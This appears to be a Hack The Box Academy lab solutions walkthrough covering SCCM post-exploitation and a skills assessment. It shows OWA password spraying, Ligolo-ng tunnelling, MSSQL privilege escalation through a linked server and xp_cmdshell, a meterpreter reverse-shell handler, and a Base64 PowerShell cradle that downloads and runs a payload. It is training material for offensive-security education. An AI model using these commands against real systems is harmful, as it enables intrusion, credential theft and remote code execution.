┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~]
└──╼ [★]$ sudo ip route add 172.50.0.0/24 dev ligolo
```

Subsequently, students will clone `sccmhunter`, initiate a Python virtual environment, and install the requirements:

Code: shell

```shell
git clone -q https://github.com/garrettfoster13/sccmhunter
cd sccmhunter/
python3 -m venv .sccmhunter
source .sccmhunter/bin/activate
python3 -m pip install -r requirements.txt
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-ifzhc4odbx]─[~]
└──╼ [★]$ git clone -q https://github.com/garrettfoster13/sccmhunter
cd sccmhunter/
python3 -m venv .sccmhunter
source .sccmhunter/bin/activate
python3 -m pip install -r requirements.txt

Collecting cmd2==2.4.3
<SNIP>
```

Students will connect to the `172.50.0.40` host using `sccmhunter` and the credentials `rai:Pxetesting01` using the `admin` command:

Code: shell

```shell
python3 sccmhunter.py admin -u rai -p 'Pxetesting01' -ip 172.50.0.40
```

```
(.sccmhunter) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-ifzhc4odbx]─[~/sccmhunter]
└──╼ [★]$ python3 sccmhunter.py admin -u rai -p 'Pxetesting01' -ip 172.50.0.40

SCCMHunter v1.0.5 by @garrfoster
[02:16:33] INFO     [!] First time use detected.                                
[02:16:33] INFO     [!] SCCMHunter data will be saved to                        
                    /home/htb-ac-8414/.sccmhunter                               
[02:16:33] INFO     [!] Enter help for extra shell commands                     
() C:\ >> 
```

They are going to use the `get_device` cmdlet followed by the name of the host (`SQL`) to obtain information about the machine, including the `SMSUniqueIdentifier` value:

Code: shell

```shell
get_device SQL
```

```
() C:\ >> get_device SQL
[02:17:53] INFO     [*] Collecting device...
[02:18:06] INFO     [+] Device found.
[02:18:06] INFO     ------------------------------------------
                    Active: 1
                    Client: 1
                    DistinguishedName: CN=SQL,CN=Computers,DC=lab,DC=local
                    FullDomainName: LAB.LOCAL
                    IPAddresses: 172.50.0.30
                    LastLogonUserDomain: LAB
                    LastLogonUserName: administrator
                    Name: SQL
                    OperatingSystemNameandVersion: Microsoft Windows NT Server 10.0
                    PrimaryGroupID: 515
                    ResourceId: 16777219
                    ResourceNames: SQL.lab.local
                    SID: S-1-5-21-2570265163-3918697770-3667495639-1214
                    SMSInstalledSites: HTB
                    SMSUniqueIdentifier: {hidden}                                                 
                    ------------------------------------------ 
```

Answer: `GUID:BD861888-7840-427C-9CC6-D4FFE022F55A`

# SCCM Post Exploitation

## Question 2

### "Which other computer account is a member of the Administrators group on SCCM01 that is not listed in the section? (Domain\\Account)"

Students are going to reuse the previously established session in `sccmhunter.py` and will utilize the `get_device` command to attain the resource ID of the `SCCM01` host:

Code: shell

```shell
get_device SCCM01
```

```
() (C:\) >> get_device SCCM01
[02:20:38] INFO     [*] Collecting device...
[02:20:39] INFO     [+] Device found.
[02:20:39] INFO     ------------------------------------------
<SNIP>          
                    PrimaryGroupID: 515
                    ResourceId: 16777220
                    ResourceNames: SCCM01.lab.local                                                                                
<SNIP>                    
```

Having obtained the `ResourceID` value of the host, students are going to interact with the host:

Code: shell

```shell
interact 16777220
```

```
() (C:\) >> interact 16777220
(16777220) (C:\) >> 
```

Subsequently, students will proceed to enumerate the administrators of the target machine using the `administrators` command to attain the answer:

Code: shell

```shell
administrators
```

```
(16777220) (C:\) >> administrators

[02:23:04] INFO     Tasked SCCM to run Administrators.
[02:23:06] INFO     Got OperationId 16787749. Sleeping 10 seconds to wait for host to call home.                                   
[02:23:16] INFO     No results yet, sleeping 10 seconds.
[02:23:26] INFO     No results yet, sleeping 10 seconds.
[02:23:36] INFO     +---------------+----------------------+-------------------+----------+                                                                                                   
                    | ObjectClass   | Name                 | PrincipalSource   | Device   |                                                                                                   
                    +===============+======================+===================+==========+                                                                                                   
                    | Group         | LAB\Domain Admins    | ActiveDirectory   | SCCM01   |                                                                                                   
                    +---------------+----------------------+--------<SNIP>             
                    +---------------+----------------------+-------------------+----------+                                                                                                   
                    | User          | LAB\{hidden}          | ActiveDirectory   | SCCM01   |                                                                                                   
                    +---------------+----------------------+-------------------+----------+                                                                                                   
                    | User          | SCCM01\Administrator | Local             | SCCM01   |                                                                                                   
                    +---------------+----------------------+-------------------+----------+ 
```

Answer: `SCCM02$`

# SCCM Post Exploitation

## Question 3

### "What's the name of the file located at SCCM02 C:\\Flag?"

Students are going to reuse the previously established session in `sccmhunter.py` and will utilize the `get_device` command to attain the resource ID of the `SCCM02` host:

Code: shell

```shell
get_device SCCM02
```

```
(16777220) (C:\) >> get_device SCCM02
[02:31:15] INFO     [*] Collecting device...
[02:31:15] INFO     [+] Device found.
[02:31:15] INFO     ------------------------------------------
<SNIP>
                    ResourceId: 16777226
                    ResourceNames: SCCM02.lab.local
<SNIP>
```

Having obtained the `ResourceID` value of the host, students are going to interact with the host:

Code: shell

```shell
interact 16777226
```

```
(16777220) (C:\) >> interact 16777226
(16777226) (C:\) >> 
```

Subsequently, students will navigate to the `C:\Flag` directory, list the contents of the directory, and obtain the answer:

Code: shell

```shell
cd C:\Flag
ls
```

```
(16777226) (C:\) >> cd C:\Flag
(16777226) (C:\Flag\) >> ls
[02:33:56] INFO     Tasked SCCM to list files in C:\Flag\.
[02:33:57] INFO     Got OperationId 16787751. Sleeping 10 seconds to wait for host to call home.
[02:34:07] INFO     No results yet, sleeping 10 seconds.
[02:34:19] INFO     No results yet, sleeping 10 seconds.
[02:34:29] INFO     +------------------------+--------+---------------------+--------+----------+
                    | FileName               | Mode   | LastWriteTime       |   Size | Device   |
+========================+========+=====================+========+==========+                                                                                             
                    | C:\Flag\{hidden} | -a---- | 2024-07-24 15:59:26 |      6 | SCCM02   |                                                                                             
                    +------------------------+--------+---------------------+--------+----------+   
```

Answer: `Read_With_SCCM`

# Skills Assessment

## Question 1

### "What's the password for the account you were able to compromise?"

After spawning the target, students will establish an RDP session using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution /drive:.,academy
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-iflhwbyulj]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.78 /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution /drive:.,academy

[00:41:06:414] [8822:8823] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[00:41:06:415] [8822:8823] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[00:41:06:415] [8822:8823] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[00:41:06:234] [8822:8823] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:41:06:234] [8822:8823] [WARN][com.freerdp.crypto] - CN = EXCH02.freightlogistics.local
[00:41:06:235] [8822:8823] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:41:06:235] [8822:8823] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:41:06:235] [8822:8823] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:41:06:235] [8822:8823] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.231.78:3389) 
[00:41:06:235] [8822:8823] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:41:06:235] [8822:8823] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:41:06:235] [8822:8823] [ERROR][com.freerdp.crypto] - 	EXCH02.freightlogistics.local
[00:41:06:235] [8822:8823] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.231.78:3389 (RDP-Server):
	Common Name: EXCH02.freightlogistics.local
	Subject:     CN = EXCH02.freightlogistics.local
	Issuer:      CN = EXCH02.freightlogistics.local
	Thumbprint:  50:51:43:85:fc:df:75:a4:a6:ef:cc:d8:54:ab:75:1e:30:97:3c:88:2f:f4:40:bf:34:53:f4:f1:67:22:9e:37
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will find a PDF file named `New Password Policy FLT` on the Desktop and are going to open it, finding the initial password format of every new user:

![[HTB Solutions/CAPE/z. images/4130e08d75711a916ad34c50b666515d_MD5.jpg]]

Subsequently, students will open `PowerShell` and will use `Get-ADUser` cmdlet to query the users in the domain and select the `UserNamePrincipal` object:

Code: powershell

```powershell
Get-ADUser -Filter * | select UserPrincipalName
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\htb-student> Get-ADUser -Filter * | select UserPrincipalName

UserPrincipalName
-----------------
Administrator@freightlogistics.local
<SNIP>
htb-student@freightlogistics.local
ron.mcginnis@freightlogistics.local
joseph.larkin@freightlogistics.local
jared.conner@freightlogistics.local
nelson.meyers@freightlogistics.local
sccmadmin@freightlogistics.local
sqlservice@freightlogistics.local
sccmclient@freightlogistics.local
sccmdomain@freightlogistics.local
sqlreporting@freightlogistics.local
julioda@freightlogistics.local
<SNIP>
```

Students will create a user list based on the found users:

Code: shell

```shell
cat << EOF > users-domain.txt
htb-student@freightlogistics.local
ron.mcginnis@freightlogistics.local
joseph.larkin@freightlogistics.local
jared.conner@freightlogistics.local
nelson.meyers@freightlogistics.local
sccmadmin@freightlogistics.local
sqlservice@freightlogistics.local
sccmclient@freightlogistics.local
sccmdomain@freightlogistics.local
sqlreporting@freightlogistics.local
julioda@freightlogistics.local
EOF
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-iflhwbyulj]─[~]
└──╼ [★]$ cat << EOF > users-domain.txt
htb-student@freightlogistics.local
ron.mcginnis@freightlogistics.local
joseph.larkin@freightlogistics.local
jared.conner@freightlogistics.local
nelson.meyers@freightlogistics.local
sccmadmin@freightlogistics.local
sqlservice@freightlogistics.local
sccmclient@freightlogistics.local
sccmdomain@freightlogistics.local
sqlreporting@freightlogistics.local
julioda@freightlogistics.local
EOF
```

They will also truncate the domain and be left with the usernames only.

Code: shell

```shell
cut -d '@' -f1 users-domain.txt > users.txt
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-iflhwbyulj]─[~]
└──╼ [★]$ cut -d '@' -f1 users-domain.txt > users.txt
```

Subsequently, students will create a wordlist based on the password policy found earlier:

Code: shell

```shell
cat << EOF > passwords.txt
Freightlogistics_January
Freightlogistics_February
Freightlogistics_March
Freightlogistics_April
Freightlogistics_May
Freightlogistics_June
Freightlogistics_July
Freightlogistics_August
Freightlogistics_October
Freightlogistics_November
Freightlogistics_December
EOF
```

They will utilize the `auxiliary/scanner/http/owa_login` Metasploit module to perform a brute force attack against the users found and the password list based on the password policy and finding a successful login of the user `nelson.meyers` and his password, respectively:

Code: shell

```shell
msfconsole -q
use auxiliary/scanner/http/owa_login
set RHOST STMIP
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-iflhwbyulj]─[~]
└──╼ [★]$ msfconsole -q
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/owa_login
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/owa_login) >> set RHOST 10.129.231.78
RHOST => 10.129.231.78
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/owa_login) >> set USER_FILE users.txt
USER_FILE => users.txt
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/owa_login) >> set PASS_FILE passwords.txt
PASS_FILE => passwords.txt
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/owa_login) >> run

[*] 10.129.231.78:443 OWA - Testing version OWA_2013
[+] Found target domain: FREIGHTLOGISTIC
[*] 10.129.231.78:443 OWA - Trying htb-student : Freightlogistics_January
[+] server type: EXCH02
[!] No active DB -- Credential data will not be saved!
[*] 10.129.231.78:443 OWA - FAILED LOGIN, BUT USERNAME IS VALID. 0.07820986 'FREIGHTLOGISTIC\htb-student' : 'Freightlogistics_January': SAVING TO CREDS
<SNIP>
[*] 10.129.231.78:443 OWA - Trying nelson.meyers : {hidden}
[+] server type: EXCH02
[+] 10.129.231.78:443 OWA - SUCCESSFUL LOGIN. 0.127102169 'FREIGHTLOGISTIC\nelson.meyers' : 'Freightlogistics_October'
[*] 10.129.231.78:443 OWA - Trying sccmadmin : Freightlogistics_January
<SNIP>
```

Answer: `Freightlogistics_October`

# Skills Assessment

## Question 2

### "Who's leading the project to upgrade the database systems?"

Students will open `Firefox` and will navigate to the OWA login page of the target host (`https://STMIP/`):

![[HTB Solutions/CAPE/z. images/a241c69e67d68f77e667bf1dc1971cb2_MD5.jpg]]

Subsequently, students will log in as `FREIGHTLOGISTIC\nelson.meyers` using the password found earlier:

![[HTB Solutions/CAPE/z. images/3f0173776f49150546bee8736cd76445_MD5.jpg]]

They will select a random time zone and click on `Save`:

![[HTB Solutions/CAPE/z. images/b61e1db225708ee05b84b92ad0e6a1da_MD5.jpg]]

Subsequently, students will find a single email named `Updates` in the user's inbox. The email contains information about system upgrades related to databases and the person who is leading the project.

![[HTB Solutions/CAPE/z. images/4aed2c87ea80300a777b11baf71cdc22_MD5.jpg]]

Answer: `ron.mcginnis`

# Skills Assessment

## Question 3

### "Achieve local administrator access on DB02. What is the value of flag.txt on the Administrator's desktop?"

Students will email the found user leading the project, where they will notice the automatic reply function is enabled and where the user shares essential details, including the database password.

![[HTB Solutions/CAPE/z. images/873cfa55534291facac37eb77848e560_MD5.jpg]]

After obtaining such information, students will enumerate the target machine. They will reuse the previously spawned `PowerShell` session and query the machine's network configuration to find the internal network IP address of the target machine (`172.16.20.55`).

Code: powershell

```powershell
ipconfig
```

```
PS C:\Users\htb-student> ipconfig

Windows IP Configuration

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 172.16.20.55
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv4 Address. . . . . . . . . . . : 10.129.231.78
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
```

Students will set up a proxy to the internal network using `Ligolo-ng`. They will download the respective binaries (`proxy` and `agent.exe`) to tunnel the traffic:

Code: shell

```shell
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~]
└──╼ [★]$ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
tar xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
chmod +x proxy

Archive:  ligolo-ng_agent_0.6.2_windows_amd64.zip
  inflating: LICENSE                 
  inflating: README.md               
  inflating: agent.exe               
LICENSE
README.md
proxy
```

Students will start the `proxy` binary as root and are going to wait for a connection from the agent:

Code: shell

```shell
sudo ./proxy -selfcert
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-abfaqfhkbl]─[~]
└──╼ [★]$ sudo ./proxy -selfcert

WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: 619647D0129A8896FA96318F8911A1E5D54383499453AFE310B9E1BA507A7519 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ \`/ __ \/ / __ \______/ __ \/ __ \`/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.6.2

ligolo-ng »  
```

Subsequently, students will return to the RDP session, open `PowerShell`, transfer the `agent.exe` binary, and establish the connection with the `proxy` server started earlier:

Code: powershell

```powershell
cp \\TSCLIENT\academy\agent.exe .
.\agent.exe -connect PWNIP:11601 -ignore-cert
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\htb-student> cp \\TSCLIENT\academy\agent.exe .
PS C:\Users\htb-student> .\agent.exe -connect 10.10.14.68:11601 -ignore-cert

time="2024-08-27T07:59:36+02:00" level=warning msg="warning, certificate validation disabled"
time="2024-08-27T07:59:36+02:00" level=info msg="Connection established" addr="10.10.14.68:11601"
```

Students will start the tunnel by choosing the session in the `proxy` window and creating the interface:

Code: shell

```shell
session
1
interface_create --name ligolo
tunnel_start --tun ligolo
```

```
lINFO[0026] Agent joined.                                 name="FREIGHTLOGISTIC\\htb-student@EXCH02" remote="10.129.231.78:12233"
ligolo-ng » session
? Specify a session : 1 - #1 - FREIGHTLOGISTIC\htb-student@EXCH02 - 10.129.231.78:12233
[Agent : FREIGHTLOGISTIC\htb-student@EXCH02] » interface_create --name ligolo
INFO[0046] Creating a new "ligolo" interface...         
INFO[0046] Interface created!                           
[Agent : FREIGHTLOGISTIC\htb-student@EXCH02] » tunnel_start --tun ligolo
INFO[0053] Starting tunnel to FREIGHTLOGISTIC\htb-student@EXCH02
```

They are going to open a new terminal tab and will specify the network for the interface to be routed:

Code: shell

```shell
sudo ip route add 172.16.20.0/24 dev ligolo
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~]
└──╼ [★]$ sudo ip route add 172.16.20.0/24 dev ligolo
```

Students will clone Impacket, start a Python virtual environment, and install the requirements:

Code: shell

```shell
git clone https://github.com/fortra/impacket
cd impacket 
python3 -m venv .impacket 
source .impacket/bin/activate 
python3 -m pip install .
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~]
└──╼ [★]$ git clone https://github.com/fortra/impacket
cd impacket 
python3 -m venv .impacket 
source .impacket/bin/activate 
python3 -m pip install .

Cloning into 'impacket'...
remote: Enumerating objects: 24167, done.
remote: Counting objects: 100% (739/739), done.
remote: Compressing objects: 100% (543/543), done.
remote: Total 24167 (delta 327), reused 346 (delta 196), pack-reused 23428 (from 1)
Receiving objects: 100% (24167/24167), 11.77 MiB | 27.77 MiB/s, done.
Resolving deltas: 100% (18120/18120), done.
<SNIP>
```

Subsequently, students will enumerate the machines in the subnet, discovering the database servers using NetExec and the credentials `ron.mcginnis:lasaer81`:

Code: shell

```shell
netexec smb 172.16.20.0/24 -u ron.mcginnis -p lasaer81
```

```
(.impacket) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/impacket]
└──╼ [★]$ netexec smb 172.16.20.0/24 -u ron.mcginnis -p lasaer81

SMB         172.16.20.50    445    SCCM             [*] Windows 10 / Server 2019 Build 17763 x64 (name:SCCM) (domain:freightlogistics.local) (signing:False) (SMBv1:False)
SMB         172.16.20.3     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:freightlogistics.local) (signing:True) (SMBv1:False)
SMB         172.16.20.40    445    DB02             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DB02) (domain:freightlogistics.local) (signing:False) (SMBv1:False)
SMB         172.16.20.55    445    EXCH02           [*] Windows 10 / Server 2019 Build 17763 x64 (name:EXCH02) (domain:freightlogistics.local) (signing:True) (SMBv1:False)
SMB         172.16.20.30    445    DB01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DB01) (domain:freightlogistics.local) (signing:False) (SMBv1:False)
SMB         172.16.20.50    445    SCCM             [+] freightlogistics.local\ron.mcginnis:lasaer81 
SMB         172.16.20.3     445    DC01             [+] freightlogistics.local\ron.mcginnis:lasaer81 
SMB         172.16.20.40    445    DB02             [+] freightlogistics.local\ron.mcginnis:lasaer81 
SMB         172.16.20.55    445    EXCH02           [+] freightlogistics.local\ron.mcginnis:lasaer81 
SMB         172.16.20.30    445    DB01             [+] freightlogistics.local\ron.mcginnis:lasaer81 
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Students will connect to `DB01` (`172.16.20.30`) using `mssqclient.py` and the credentials of `ron.mcginnis`:

Code: shell

```shell
python3 examples/mssqlclient.py FREIGHTLOGISTIC/ron.mcginnis:lasaer81@172.16.20.30 -windows-auth
```

```
(.impacket) ┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/impacket]
└──╼ [★]$ python3 examples/mssqlclient.py FREIGHTLOGISTIC/ron.mcginnis:lasaer81@172.16.20.30 -windows-auth

Impacket v0.12.0.dev1+20240828.175257.27e7e747 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(db01): Line 1: Changed database context to 'master'.
[*] INFO(db01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (FREIGHTLOGISTIC\ron.mcginnis  guest@master)>
```

Subsequently, they will enumerate the database using built-in commands such as `enum_db` to enumerate the databases in the MSSQL server instance, switch to a non-default database, and enumerate the users using `enum_users` to find `ron.mcginnis` be assigned the `db_owner` role:

Code: shell

```shell
enum_db
USE prod;
enum_users
```

```
SQL (FREIGHTLOGISTIC\ron.mcginnis  guest@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   
tempdb                   0   
model                    0   
msdb                     1   
prod                     1 

SQL (FREIGHTLOGISTIC\ron.mcginnis  guest@master)> USE prod;
ENVCHANGE(DATABASE): Old Value: master, New Value: prod
INFO(db01): Line 1: Changed database context to 'prod'.

SQL (FREIGHTLOGISTIC\ron.mcginnis  FREIGHTLOGISTIC\ron.mcginnis@prod)> enum_users
UserName                       RoleName   LoginName                      DefDBName   DefSchemaName       UserID                                                           SID   
----------------------------   --------   ----------------------------   ---------   -------------   ----------   -----------------------------------------------------------   
dbo                            db_owner   sa                             master      dbo             b'1         '                                                         b'01'   

FREIGHTLOGISTIC\ron.mcginnis   db_owner   FREIGHTLOGISTIC\ron.mcginnis   master      dbo             b'6         '   b'010500000000000515000000c59376853f16716afebc2d6c7b040000'   

guest                          public     NULL                           NULL        guest           b'2         '                                                         b'00'   
<SNIP>
```

Students will take advantage of the `db_owner` role to create a procedure to escalate to the privileges of `sysadmin`:

Code: sql

```sql
CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'FREIGHTLOGISTIC\ron.mcginnis', 'sysadmin'; 
EXECUTE sp_privesc; 
DROP PROCEDURE sp_privesc; 
```

```
SQL (FREIGHTLOGISTIC\ron.mcginnis  FREIGHTLOGISTIC\ron.mcginnis@prod)> CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'FREIGHTLOGISTIC\ron.mcginnis', 'sysadmin'; 

SQL (FREIGHTLOGISTIC\ron.mcginnis  FREIGHTLOGISTIC\ron.mcginnis@prod)> EXECUTE sp_privesc; 
SQL (FREIGHTLOGISTIC\ron.mcginnis  dbo@prod)> DROP PROCEDURE sp_privesc; 
```

Right after the SQL privilege escalation operations, students will enumerate the database links to find the link to `DB02` and the local and remote logins of `sa`:

Code: shell

```shell
enum_links
```

```
SQL (FREIGHTLOGISTIC\ron.mcginnis  dbo@prod)> enum_links
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
db01       SQLNCLI            SQL Server    db01             NULL                 NULL           NULL      

DB02       SQLNCLI            SQL Server    DB02             NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
db01            NULL                        1   NULL           

DB02            NULL                        1   NULL           

DB02            sa                          0   sa 
```

Students will use the `exec_as_login` command to execute commands as the system user `sa`, use the link to `DB02` using the `use_link` command, and they will enable `xp_cmdshell`:

Code: shell

```shell
exec_as_login sa
use_link DB02
enable_xp_cmdshell
```

```
SQL (FREIGHTLOGISTIC\ron.mcginnis  dbo@prod)> exec_as_login sa
SQL (sa  dbo@prod)> use_link DB02
SQL >DB02 (sa  dbo@prod)> enable_xp_cmdshell 

INFO(db02): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(db02): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Students will open a new terminal tab and use Metasploit to start the `multi/handler` module and to capture the meterpreter session on the target system:

Code: shell

```shell
msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST PWNIP; set LPORT PWNPO; set EXITONSESSION false; set EXITFUNC thread; run -j"
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/impacket]
└──╼ [★]$ msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.68; set LPORT 8888; set EXITONSESSION false; set EXITFUNC thread; run -j"

Metasploit tip: Use sessions -1 to interact with the last opened session
                                                  
 _                                                    _
<SNIP>

[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_https
LHOST => 10.10.14.68
LPORT => 8888
EXITONSESSION => false
EXITFUNC => thread
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[msf](Jobs:1 Agents:0) exploit(multi/handler) >> 
[*] Started HTTPS reverse handler on https://10.10.14.68:8888
```

Right after starting the HTTPS reverse handler, students will create a PowerShell reverse shell payload called `s` in a new terminal tab using `msfvenom`:

Code: shell

```shell
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=PWNIP LPORT=PWNPO -f psh-reflection -o s
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/impacket]
└──╼ [★]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.68 LPORT=8888 -f psh-reflection -o s

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 647 bytes
Final size of psh-reflection file: 3376 bytes
Saved as: s
```

Students will start a Python HTTP server:

Code: shell

```shell
python3 -m http.server
```

```
┌─[eu-academy-6]─[10.10.14.68]─[htb-ac-8414@htb-hf7rli2eke]─[~/impacket]
└──╼ [★]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

They will return to the proxy server console of `Ligolo` and are going to create a port-forward from the initial target to their workstations:

Code: shell

```shell
listener_add --addr 0.0.0.0:PWNPO --to 0.0.0.0:8000 --tcp
```

```
[Agent : FREIGHTLOGISTIC\htb-student@EXCH02] » listener_add --addr 0.0.0.0:9001 --to 0.0.0.0:8000 --tcp

INFO[3506] Listener 0 created on remote agent! 
```

Subsequently, students will return to the previously established RDP session, open `PowerShell`, and encode the download payload to Base64 encoding while specifying the internal IP address of the `EXCH02` host as the download URL:

Code: powershell

```powershell
$payload = 'IEX(New-Object Net.Webclient).downloadString("http://172.16.20.55:PWNPO/s")'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\htb-student> $payload = 'IEX(New-Object Net.Webclient).downloadString("http://172.16.20.55:9001/s")'
PS C:\Users\htb-student> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))

SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAwAC4ANQA1ADoAOQAwADAAMQAvAHMAIgApAA==
```

Students will return to the `mssqclient.py` session and are going to utilize `xp_cmdshell` to execute the Base64 payload:

Code: shell

```shell
xp_cmdshell powershell -E SQBFA<BASE64_PAYLOAD>AIgApAA==
```

```
SQL >DB02 (sa  dbo@prod)> xp_cmdshell powershell -E SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAwAC4ANQA1ADoAOQAwADAAMQAvAHMAIgApAA==
```

